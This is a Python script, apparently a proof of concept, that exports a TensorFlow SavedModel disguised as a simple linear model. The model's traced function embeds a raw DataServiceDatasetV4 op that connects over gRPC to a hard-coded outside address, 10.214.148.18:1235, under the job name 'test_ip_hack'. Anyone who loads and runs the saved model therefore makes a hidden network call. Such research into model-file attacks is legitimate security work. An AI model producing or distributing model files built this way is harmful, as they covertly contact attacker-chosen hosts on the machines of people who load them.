import tensorflow as tf
from tensorflow.python.data.ops.dataset_ops import DatasetV2, DatasetSource
from tensorflow.python.framework import tensor_spec

class tmpclass(DatasetSource):
    def __init__(self, variant_tensor):
        super(tmpclass, self).__init__(variant_tensor)
    
    @property
    def element_spec(self):
        return tensor_spec.TensorSpec([], tf.int64)
    
class SimpleLinearModel(tf.Module):
    def __init__(self):
        self.a = tf.Variable(3.0)
        self.b = tf.Variable(2.0)
        self.v = tf.Variable([1, 2, 3], dtype=tf.int8)

    @tf.function
    def __call__(self, x):
        from tensorflow.python.data.experimental.ops import compression_ops
        from tensorflow.python.data.ops import structured_function
        from tensorflow.python.framework import dtypes
        from tensorflow.python.framework import tensor_spec
        from tensorflow.python.data.experimental.service.server_lib import DispatcherConfig
        from tensorflow.python.eager import function
        from tensorflow.python.ops.gen_experimental_dataset_ops import register_dataset, register_dataset_v2
        resource_handler = tf.raw_ops.VarHandleOp(dtype=tf.int64, shape = 1)
        uncompress_func = structured_function.StructuredFunctionWrapper(
            lambda x: compression_ops.uncompress(x, output_spec=tensor_spec.TensorSpec(shape=(), dtype=dtypes.variant)),
            transformation_name="DataServiceDataset.uncompress()",
            input_structure=tensor_spec.TensorSpec(shape=(), dtype=dtypes.variant))
        # dataset_id = register_dataset_v2(dataset=dataset._variant_tensor, address="10.214.148.18:{}".format(1235), protocol="grpc", external_state_policy=0)
        result = tf.raw_ops.DataServiceDatasetV4(
            dataset_id='1000',
            processing_mode="parallel_epochs",
            address="10.214.148.18:{}".format(1235),
            # address=dispatcher_address,
            protocol="grpc",
            job_name="test_ip_hack",
            consumer_index=1,
            num_consumers=10,
            uncompress_fn=uncompress_func.function,
            max_outstanding_requests=10,
            iteration_counter=resource_handler,
            output_types=[tf.int64],
            uncompress=False,
            output_shapes=[()]
        )
        # dataset = tmpclass(result)
        # iterable = iter(dataset)
        # for item in iterable:
        #     tf.print(item)

        return self.a * x + self.b

# 实例化模型
model = SimpleLinearModel()
result = model(tf.constant(5.0))
save_dir = 'model/DataServiceDataset/saved_model'
tf.saved_model.save(model,save_dir)
